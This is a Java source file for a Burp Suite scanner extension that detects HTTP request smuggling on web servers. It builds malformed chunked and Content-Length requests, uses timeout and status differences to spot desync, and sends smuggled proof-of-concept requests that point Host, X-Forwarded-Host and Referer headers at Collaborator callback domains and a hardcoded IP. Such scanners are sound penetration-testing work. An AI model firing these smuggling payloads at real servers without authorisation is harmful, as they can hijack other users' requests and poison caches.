package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.zip.GZIPOutputStream;

public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {

    ChunkContentScan(String name) {
        super(name);
    }

    boolean sendPoc(byte[] base, IHttpService service, HashMap<String, Boolean> config) {

        HashSet<Boolean> results = new LinkedHashSet<>();
        if (Utilities.globalSettings.getBoolean("poc: G")) {
            results.add(prepPoc(base, service, "G", "G", config));
        }
        //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".z88m811soo7x6fxuo08vu4wd94fw3l.burpcollaborator.net\r\n\r\n");
        //boolean cpoc = sendPoc(base, service, "collab", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");

        String collabWithHost = service.getHost() + ".xgh671sw1qfujgcs17uxlyxn4ea4yt.psres.net";

        if (Utilities.globalSettings.getBoolean("poc: headerConcat")) {
            results.add(prepPoc(base, service, "headerConcat",
                      "GET /?x=ma0y2848iz35nt9im7yeziwqxh37rw/"+service.getHost()+" HTTP/1.1\r\n" +
                            "Host: 52.16.21.24\r\n" +
                            "Foo: x", config));
        }
        if (Utilities.globalSettings.getBoolean("poc: bodyConcat")) {
            results.add(prepPoc(base, service, "bodyConcat",
                      "POST /?x=ma0y2848iz35nt9im7yeziwqxh37rw/"+service.getHost()+" HTTP/1.1\r\n" +
                            "Host: 52.16.21.24\r\n" +
                            "Content-Type: application/x-www-form-urlencoded\r\n" +
                            "Content-Length: 8\r\n\r\n" +
                            "foo=", config));
        }
        if (Utilities.globalSettings.getBoolean("poc: collab")) {
            results.add(prepPoc(base, service, "collab",
                      "GET / HTTP/1.1\r\n" +
                            "Host: "+collabWithHost+"\r\n\r\n", config));
        }
        if (Utilities.globalSettings.getBoolean("poc: collab-header")) {
            results.add(prepPoc(base, service, "collab-header",
                      "GET / HTTP/1.1\r\n" +
                            "Host: "+collabWithHost+"\r\n" +
                            "X-Foo: X", config));
        }
        if (Utilities.globalSettings.getBoolean("poc: collab-XFO-header")) {
            results.add(prepPoc(base, service, "collab-header",
                    "GET / HTTP/1.1\r\n" +
                    "X-Forwarded-Host: "+collabWithHost+"\r\n" +
                    "X-Foo: X", config));
        }
        if (Utilities.globalSettings.getBoolean("poc: collab-abs")) {
            results.add(prepPoc(base, service, "collab-header",
                      "GET http://"+collabWithHost+"/ HTTP/1.1\r\n" +
                            "X-Foo: X", config));
        }
        if (Utilities.globalSettings.getBoolean("poc: collab-at")) {
            results.add(prepPoc(base, service,
                      "collab-header",
                      "GET @"+collabWithHost+"/ HTTP/1.1\r\n" +
                            "X-Foo: X", config));
        }
        if (Utilities.globalSettings.getBoolean("poc: collab-blind")) {
            String req = String.format(
                    "GET / HTTP/1.1\r\n" +
                    "Host: %s\r\n" +
                    "Referer: ref.%s\r\n" +
                    "X-Forwarded-For: xff.%s\r\n" +
                    "True-Client-IP: tci.%s\r\n" +
                    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\r\n" +
                    "Accept-Encoding: gzip, deflate\r\n" +
                    "Accept: */*\r\n" +
                    "Accept-Language: en\r\n" +
                    "connection: close\r\n\r\n", service.getHost(), collabWithHost, collabWithHost, collabWithHost);
            // 'Connection: close' gets changed to keep-alive which breaks the offset
            results.add(prepPoc(base, service, "collab-header", req, config));
        }
        return results.contains(Boolean.TRUE);
    }

    class DualChunkCL {
        String getAttack(byte[] base, String inject, HashMap<String, Boolean> config) {
            byte[] prep = Utilities.setHeader(base, "Connection", "keep-alive");
            prep = bypassContentLengthFix(makeChunked(prep, inject.length(), 0, config));
            return Utilities.helpers.bytesToString(prep)+inject;
        }
    }

    class DualChunkTE {
        String getAttack(byte[] base, String inject, HashMap<String, Boolean> config) {
            try {
                byte[] initial = Utilities.setHeader(base, "Connection", "keep-alive");
                ByteArrayOutputStream attackStream = new ByteArrayOutputStream();
                attackStream.write(initial);
                attackStream.write(inject.getBytes());

                byte[] attack = makeChunked(attackStream.toByteArray(), 0, 0, config);
                String attackString = Utilities.helpers.bytesToString(attack);
                int CL = attackString.lastIndexOf(inject) - Utilities.getBodyStart(attack);
                attack = Utilities.setHeader(attack, "Content-Length", String.valueOf(CL));

                attack = bypassContentLengthFix(attack);
                Utils.out(Utilities.helpers.bytesToString(attack));
                return Utilities.helpers.bytesToString(attack);
            } catch (IOException e) {
                return null;
            }
        }
    }

    boolean prepPoc(byte[] base, IHttpService service, String name, String inject, HashMap<String, Boolean> config) {
        String setupAttack = new DualChunkCL().getAttack(base, inject, config);
        //setupAttack = new DualChunkTE().getAttack(base, inject, config);
        byte[] victim = makeChunked(base, 0, 0, config);
        return sendPoc(name, setupAttack, victim, service, new HashMap<>());
    }



    byte[] bypassContentLengthFix(byte[] req) {
        return Utilities.replace(req, "Content-Length: ".getBytes(), "Content-length: ".getBytes());
    }

    public boolean doConfiguredScan(byte[] original, IHttpService service, HashMap<String, Boolean> config) {
        if (Utilities.globalSettings.getBoolean("avoid rescanning vulnerable hosts") && BurpExtender.hostsToSkip.containsKey(service.getHost())) {
            return false;
        }

        original = setupRequest(original);

        original = Utilities.addOrReplaceHeader(original, "Transfer-Encoding", "foo");
        original = Utilities.setHeader(original, "Connection", "close");

        byte[] baseReq = makeChunked(original, 0, 0, config);
        Resp syncedResp = request(service, baseReq);
        if (syncedResp.timedOut()) {
            Utilities.log("Timeout on first request. Aborting.");
            return false;
        }

        Resp suggestedProbe = buildPoc(original, service, config);

        if (Utilities.globalSettings.getBoolean("try chunk-truncate")) {
            byte[] reverseLength = makeChunked(original, -1, 0, config); //Utilities.setHeader(baseReq, "Content-Length", "4");
            Resp truncatedChunk = request(service, reverseLength, 3);
            if (truncatedChunk.timedOut()) {

                if (request(service, baseReq).timedOut()) {
                    return false;
                }

                Utilities.log("Reporting reverse timeout technique worked");
                String title = "TE-CL " + String.join("|", config.keySet());
                if (!sendPoc(original, service, config)) {
                    title += " unconfirmed";
                }
                report(title, "status:timeout", syncedResp, truncatedChunk, suggestedProbe);
                return true;
            } else if (config.containsKey("vanilla")) {
                byte[] dualChunkTruncate = Utilities.addOrReplaceHeader(reverseLength, "Transfer-encoding", "cow");
                Resp truncatedDualChunk = request(service, dualChunkTruncate, 3);
                if (truncatedDualChunk.timedOut()) {

                    if (request(service, baseReq).timedOut()) {
                        return false;
                    }

                    Utilities.log("Reverse timeout technique with dual TE header worked");
                    String title = "TE-CL: dualchunk";
                    if (!sendPoc(Utilities.addOrReplaceHeader(original, "Transfer-encoding", "cow"), service, config)) {
                        title += " unconfirmed";
                    }
                    report(title, "status:timeout", syncedResp, truncatedDualChunk, suggestedProbe);
                    return true;
                }
            }
        }

        if (Utilities.globalSettings.getBoolean("try timeout-diff")) {

            // if we get to here, either they're secure or the frontend uses chunked
            byte[] overlongLength = makeChunked(original, 1, 0, config); //Utilities.setHeader(baseReq, "Content-Length", "6");
            Resp overlongLengthResp = request(service, overlongLength);
            short overlongLengthCode = 0;
            if (!overlongLengthResp.timedOut()) {
                overlongLengthCode = overlongLengthResp.getInfo().getStatusCode();
            }
            if (overlongLengthCode == syncedResp.getInfo().getStatusCode()) {
                Utilities.log("Overlong content length didn't cause a timeout or code-change. Aborting.");
                return false;
            }

            byte[] invalidChunk = Utilities.setBody(baseReq, "Z\r\n\r\n");
            invalidChunk = Utilities.setHeader(invalidChunk, "Content-Length", "5");
            Resp badChunkResp = request(service, invalidChunk);
            if (badChunkResp.timedOut()) {
                Utilities.log("Bad chunk attack timed out. Aborting.");
                return false;
            }

            if (badChunkResp.getStatus() == syncedResp.getStatus()) {
                Utilities.log("Invalid chunk probe didn't do anything. Attempting overlong chunk timeout instead.");

                byte[] overlongChunk = makeChunked(original, 0, 1, config); //Utilities.setBody(baseReq, "1\r\n\r\n");
                Resp overlongChunkResp = request(service, overlongChunk);

                short overlongChunkCode = overlongChunkResp.getStatus();

                if (overlongChunkCode == syncedResp.getStatus() || overlongChunkCode == overlongLengthCode) {
                    Utilities.log("Invalid chunk and overlong chunk both had no effect. Aborting.");
                    return false;
                }

                badChunkResp = overlongChunkResp;
            }

            String title = "Req smuggling: overlong diff";
            if (!sendPoc(original, service, config)) {
                title += " unconfirmed";
            }
            report(title, "Status:BadChunkDetection:BadLengthDetected", syncedResp, badChunkResp, overlongLengthResp, suggestedProbe);
            return true;
        }

        return false;
    }
}

